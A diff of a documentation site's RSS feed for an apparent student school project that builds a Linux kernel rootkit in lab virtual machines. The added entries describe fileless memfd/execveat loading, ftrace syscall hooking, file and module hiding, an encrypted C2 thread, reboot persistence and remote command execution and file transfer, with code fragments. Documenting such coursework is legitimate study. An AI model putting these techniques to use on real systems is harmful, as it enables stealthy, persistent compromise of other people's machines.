@@ -1,19 +1,269 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 11 May 2025 16:54:28 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;p>Details about the connection mechanism (how it connects back, retries).&lt;/p></description></item><item><title>Persistence</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;p>How the rootkit achieves persistence across reboots.&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;p>How access to the rootkit is secured.&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;p>How commands are executed on the victim and results returned.&lt;/p></description></item><item><title>File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;p>Details on the upload and download functionality.&lt;/p></description></item><item><title>Hiding (Cardboard Box)</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Our rootkit must be invisible to standard user-land tools. We achieve this by hooking key syscalls and filtering out any trace of:&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 11 May 2025 20:22:17 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;p>Details about the connection mechanism (how it connects back, retries).&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;p>How access to the rootkit is secured.&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;p>How commands are executed on the victim and results returned.&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;p>Details on the encryption used for communication.&lt;/p></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;p>Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).&lt;/p></description></item><item><title>Fileless Dropper &amp; Rootkit Loader</title><link>/docs/04-epirootkit/features/fileless-dropper-loader/</link><pubDate>Sun, 11 May 2025 18:15:00 +0100</pubDate><guid>/docs/04-epirootkit/features/fileless-dropper-loader/</guid><description>&lt;h1 id="stage-1-fileless-memfd-dropper">Stage 1: Fileless Memfd Dropper &lt;a href="#stage-1-fileless-memfd-dropper" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ ⚙️
+ &lt;/div>
+ 
+ &lt;div class="w-100">We stage both loader and cron stub entirely in memory&amp;ndash;no on-disk binaries.&lt;/div>
+ &lt;/div>
+&lt;ol>
+&lt;li>We call
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="8c2bc79" class="language-c ">
+ &lt;code>fd_loader = memfd_create(&amp;#34;loader&amp;#34;, MFD_CLOEXEC);
+fd_target = memfd_create(&amp;#34;target&amp;#34;, MFD_CLOEXEC);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+to get two anonymous file descriptors.&lt;/li>
+&lt;li>We &lt;code>write()&lt;/code> our embedded ELF blobs into each fd.&lt;/li>
+&lt;li>We &lt;code>fork()&lt;/code>:
 &lt;ul>
-&lt;li>attacker files/directories with the prefix &lt;code>jules_est_bo_&lt;/code>&lt;/li>
-&lt;li>in-memory file descriptors (&lt;code>memfd:*&lt;/code>)&lt;/li>
-&lt;li>the kernel module itself&lt;/li>
-&lt;li>hidden kernel threads / PIDs&lt;/li>
+&lt;li>&lt;strong>Child&lt;/strong>: redirect stdout/stderr to &lt;code>/dev/null&lt;/code>, then
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="0edd0ef" class="language-c ">
+ &lt;code>execveat(fd_loader, NULL, argv_loader, envp, AT_EMPTY_PATH);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>&lt;strong>Parent&lt;/strong>: &lt;code>waitpid()&lt;/code>, then
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="169713e" class="language-c ">
+ &lt;code>execveat(fd_target, NULL, argv_target, envp, AT_EMPTY_PATH);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
 &lt;/ul>
-&lt;p>All hooks are installed via the ftrace framework and removed cleanly at unload.&lt;/p>
-&lt;hr>
-&lt;h2 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="11-purpose">1.1 Purpose &lt;a href="#11-purpose" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Prevent any process from seeing files or directories created by the rootkit (e.g. under &lt;code>/usr/share/zov_f/&lt;/code> or with prefix &lt;code>jules_est_bo_&lt;/code>).&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;p>Details on the encryption used for communication.&lt;/p></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;p>Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).&lt;/p></description></item><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>execveat(..., AT_EMPTY_PATH)&lt;/code> lets us execute a program by FD without any filename on disk.&lt;/p></description></item><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Capitaine: Hugo Sibony
+Responsable Sabordage et mutinerie: Léa Bonet&lt;/p>
+&lt;h2 id="nom-de-léquipe">Nom de l&amp;rsquo;équipe &lt;a href="#nom-de-l%c3%a9quipe" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Nous sommes Tux Fan Club 🐧&lt;/p>
 &lt;p>C&amp;rsquo;est Léa qui a choisi le nom car c&amp;rsquo;est la seule personne du groupe un peu créative 👀&lt;/p>
 &lt;p>(Et par ce que Hugo est gentleman et a laissé le choix a la seule femme du groupe)&lt;/p>
-&lt;p>Tux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP&lt;/p>
-&lt;figure>&lt;img src="/images/introduction/alltuxes.png"
- alt="Tux le manchot">
-&lt;/figure></description></item><item><title>Host Environment</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;p>Details about the required host environment (EPITA Laptop, Ubuntu 24.10).&lt;/p></description></item><item><title>Virtualization Software</title><link>/docs/02-setup/virtualization/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/virtualization/</guid><description>&lt;p>Guidance on choosing and installing virtualization software (VirtualBox, QEMU/KVM, etc.).&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Step-by-step guide to create and configure the Attacking Virtual Machine.&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;p>Step-by-step guide to create and configure the Victim Virtual Machine.&lt;/p></description></item><item><title>Technology Choice</title><link>/docs/03-attacking-program/technology-choice/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/technology-choice/</guid><description>&lt;p>Rationale for the technology used (language, framework, UI type).&lt;/p></description></item><item><title>Deployment</title><link>/docs/03-attacking-program/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/deployment/</guid><description>&lt;p>Instructions on how to build and install/deploy the attacking program.&lt;/p></description></item><item><title>Usage</title><link>/docs/03-attacking-program/usage/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;p>How to use the attacking program to interact with the rootkit.&lt;/p></description></item><item><title>Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;p>Instructions on how to compile the module (&lt;code>Makefile&lt;/code>) and load it into the kernel (&lt;code>insmod&lt;/code>/&lt;code>modprobe&lt;/code>).&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
+&lt;p>Tux est un manchot représentant le noyau Linux. Il a été crée en 1996 par Larry Ewing sur GIMP&lt;/p></description></item><item><title>Symbol Resolution &amp; Ftrace Hooks</title><link>/docs/04-epirootkit/features/symbol-ftrace/</link><pubDate>Sun, 11 May 2025 18:20:00 +0100</pubDate><guid>/docs/04-epirootkit/features/symbol-ftrace/</guid><description>&lt;h1 id="symbol-resolution">Symbol Resolution &lt;a href="#symbol-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;ol>
+&lt;li>We spoof a GPL license so the kernel exports &lt;code>kallsyms_lookup_name()&lt;/code>:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="301615e" class="language-c ">
+ &lt;code>MODULE_LICENSE(&amp;#34;GPL&amp;#34;);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>At init, we call:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="20e28ad" class="language-c ">
+ &lt;code>sys_call_table = (void **)kallsyms_lookup_name(&amp;#34;sys_call_table&amp;#34;);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+This gives us the address of the syscall table.&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="ftrace-based-hooking">Ftrace-Based Hooking &lt;a href="#ftrace-based-hooking" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ 🔧
+ &lt;/div>
+ 
+ &lt;div class="w-100">We use ftrace to hook without writing to kernel memory directly.&lt;/div>
+ &lt;/div>
+&lt;p>For each target syscall:&lt;/p>
+&lt;ol>
+&lt;li>Define an &lt;code>ftrace_ops&lt;/code> with flags:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f3796aa" class="language-c ">
+ &lt;code>.func = hook_trampoline,
+.flags = FTRACE_OPS_FL_SAVE_REGS |
+ FTRACE_OPS_FL_IPMODIFY&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Apply the filter:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c83d517" class="language-c ">
+ &lt;code>ftrace_set_filter_ip(&amp;amp;ops, (unsigned long)orig_syscall, 0, 0);
+register_ftrace_function(&amp;amp;ops);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Our trampoline copies registers, calls &lt;code>hook_fn()&lt;/code>, then jumps back to the original.&lt;/li>
+&lt;/ol>
+&lt;p>Always unregister your ftrace functions in &lt;code>cleanup_module()&lt;/code>:&lt;/p></description></item><item><title>Host Environment</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;p>Details about the required host environment (EPITA Laptop, Ubuntu 24.10).&lt;/p></description></item><item><title>Virtualization Software</title><link>/docs/02-setup/virtualization/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/virtualization/</guid><description>&lt;p>Guidance on choosing and installing virtualization software (VirtualBox, QEMU/KVM, etc.).&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Step-by-step guide to create and configure the Attacking Virtual Machine.&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;p>Step-by-step guide to create and configure the Victim Virtual Machine.&lt;/p></description></item><item><title>Stealth Hooks &amp; daniel.* Commands</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 11 May 2025 18:25:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+We hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Call the original syscall to fill a &lt;code>dirent&lt;/code> buffer.&lt;/li>
+&lt;li>Traverse entries; if &lt;code>d_name&lt;/code> starts with any prefix in
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="6c2d135" class="language-c ">
+ &lt;code>hide_prefixes[] = { &amp;#34;jules_est_bo_&amp;#34;, &amp;#34;memfd:&amp;#34; };&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+we drop that entry by &lt;code>memmove()&lt;/code>.&lt;/li>
+&lt;li>Return the new byte count.&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="2-module-hiding">2. Module Hiding &lt;a href="#2-module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+We hide our LKM from &lt;code>/proc/modules&lt;/code> and &lt;code>lsmod&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
+We hook the procfs &lt;code>iterate&lt;/code> method for &lt;code>/proc/modules&lt;/code> and &lt;code>/sys/modules&lt;/code>, filtering out &lt;code>&amp;quot;epirootkit&amp;quot;&lt;/code> entries.&lt;/p></description></item><item><title>Technology Choice</title><link>/docs/03-attacking-program/technology-choice/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/technology-choice/</guid><description>&lt;p>Rationale for the technology used (language, framework, UI type).&lt;/p></description></item><item><title>Deployment</title><link>/docs/03-attacking-program/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/deployment/</guid><description>&lt;p>Instructions on how to build and install/deploy the attacking program.&lt;/p></description></item><item><title>Usage</title><link>/docs/03-attacking-program/usage/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;p>How to use the attacking program to interact with the rootkit.&lt;/p></description></item><item><title>Encrypted C2, Persistence &amp; Auth</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 11 May 2025 18:30:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="1-encrypted-c2-heartbeat">1. Encrypted C2 Heartbeat &lt;a href="#1-encrypted-c2-heartbeat" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Spawn a kernel thread to poll our C2 server.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>kthread_run(c2_thread_fn, &amp;amp;cfg, &amp;quot;epic2&amp;quot;)&lt;/code>.&lt;/li>
+&lt;li>Loop:
+&lt;ul>
+&lt;li>&lt;code>msleep(ping_interval_ms)&lt;/code>.&lt;/li>
+&lt;li>&lt;code>kernel_socket()&lt;/code>, &lt;code>kernel_connect(attacker_ip, port)&lt;/code>.&lt;/li>
+&lt;li>Exchange AES-128-CBC packets using keys from &lt;code>.epirootkit-config&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="2-persistence--autoload">2. Persistence &amp;amp; Autoload &lt;a href="#2-persistence--autoload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Automatically load on reboot.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
+Our &lt;code>installer.sh&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>Copies &lt;code>epirootkit.ko&lt;/code> to &lt;code>/lib/modules/$(uname -r)/extra/&lt;/code>.&lt;/li>
+&lt;li>Runs &lt;code>depmod -a&lt;/code>.&lt;/li>
+&lt;li>Writes &lt;code>/etc/modules-load.d/epirootkit.conf&lt;/code> with:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3079c8b" class="language- ">
+ &lt;code>epirootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="3-password-protection">3. Password Protection &lt;a href="#3-password-protection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Protect &lt;code>daniel.*&lt;/code> commands with a salted hash.&lt;/p></description></item><item><title>Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;p>Instructions on how to compile the module (&lt;code>Makefile&lt;/code>) and load it into the kernel (&lt;code>insmod&lt;/code>/&lt;code>modprobe&lt;/code>).&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
  &lt;div class="flex-shrink-1 alert-icon">
  
  ⚙️
@@ -30,15 +280,15 @@
 &lt;div class="alert alert-success d-flex" role="alert">
  &lt;div class="flex-shrink-1 alert-icon">
  
- task_alt
+ check
  &lt;/div>
  
- &lt;div class="w-100">LTS release&amp;ndash;five years of security updates and readily available VM images (ISO/QCOW2).&lt;/div>
+ &lt;div class="w-100">Perfect balance between realism and convinience.&lt;/div>
  &lt;/div>
 &lt;ul>
 &lt;li>Widely deployed on servers and desktops&lt;/li>
 &lt;li>Official cloud and container images simplify automation&lt;/li>
-&lt;li>Predictable package versions and a large user community&lt;/li>
+&lt;li>Already uses interesting kernel version (5.4.x) so no need to compile.&lt;/li>
 &lt;/ul>
 &lt;hr>
 &lt;h2 id="why-kernel-54x">Why Kernel 5.4.x? &lt;a href="#why-kernel-54x" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
@@ -52,7 +302,47 @@
  &lt;/div>
 &lt;ol>
 &lt;li>
-&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Handout Format</title><link>/docs/05-submission/handout-format/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-submission/handout-format/</guid><description>&lt;p>Details on the required file structure, &lt;code>AUTHORS&lt;/code>, &lt;code>README&lt;/code>, and &lt;code>TODO&lt;/code> files.&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/07-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/07-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Remote Exec &amp; File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 11 May 2025 18:35:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="1-remote-command-execution">1. Remote Command Execution &lt;a href="#1-remote-command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Allow arbitrary program execution via C2.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Receive a packet:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="265fa6f" class="language- ">
+ &lt;code>EXEC &amp;lt;len&amp;gt;\n&amp;lt;payload&amp;gt;&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Use &lt;code>call_usermodehelper(argv, envp, UMH_WAIT_PROC)&lt;/code> to spawn the process.&lt;/li>
+&lt;li>Capture its &lt;code>stdout&lt;/code>/&lt;code>stderr&lt;/code> via kernel pipes and send back encrypted.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="2-file-upload">2. File Upload &lt;a href="#2-file-upload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Accept files from the attacker.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Receive &lt;code>UPLOAD &amp;lt;path&amp;gt; &amp;lt;len&amp;gt;\n&amp;lt;data&amp;gt;&lt;/code>.&lt;/li>
+&lt;li>&lt;code>filp_open(&amp;quot;/usr/share/epirootkit/&amp;lt;path&amp;gt;&amp;quot;, O_CREAT|O_WRONLY, 0600)&lt;/code>.&lt;/li>
+&lt;li>&lt;code>kernel_write()&lt;/code> the data.&lt;/li>
+&lt;li>Our &lt;code>getdents()&lt;/code> hook keeps &lt;code>/usr/share/epirootkit&lt;/code> hidden.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="3-file-download">3. File Download &lt;a href="#3-file-download" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Send files to the attacker.&lt;/p></description></item><item><title>Handout Format</title><link>/docs/05-submission/handout-format/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-submission/handout-format/</guid><description>&lt;p>Details on the required file structure, &lt;code>AUTHORS&lt;/code>, &lt;code>README&lt;/code>, and &lt;code>TODO&lt;/code> files.&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/07-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/07-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
 &lt;p>En effet, comme tout bon pirate, nous avons téléchargé &lt;em>légalement&lt;/em> les fichiers fournis (&lt;code>given files&lt;/code>) et nous souhaitions les ignorer avec un fichier &lt;code>.gitignore&lt;/code>.&lt;/p>
 &lt;p>Le &lt;code>.gitignore&lt;/code> ressemblait à :&lt;/p>
 
@@ -80,4 +370,6 @@ givenfiles/&lt;/code>
  alt="Arborescence révélant le fichier caché">
 &lt;/figure>
 
-&lt;em>Arborescence révélant le fichier caché&lt;/em>&lt;/p></description></item></channel></rss>
+&lt;em>Arborescence révélant le fichier caché&lt;/em>&lt;/p></description></item><item><title>Un dernier mot</title><link>/docs/08-remerciements/thankyou/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/08-remerciements/thankyou/</guid><description>&lt;h1 id="hugo">Hugo &lt;a href="#hugo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bonjour,&lt;/p>
+&lt;p>Merci beaucoup Jules pour ce projet!&lt;/p>
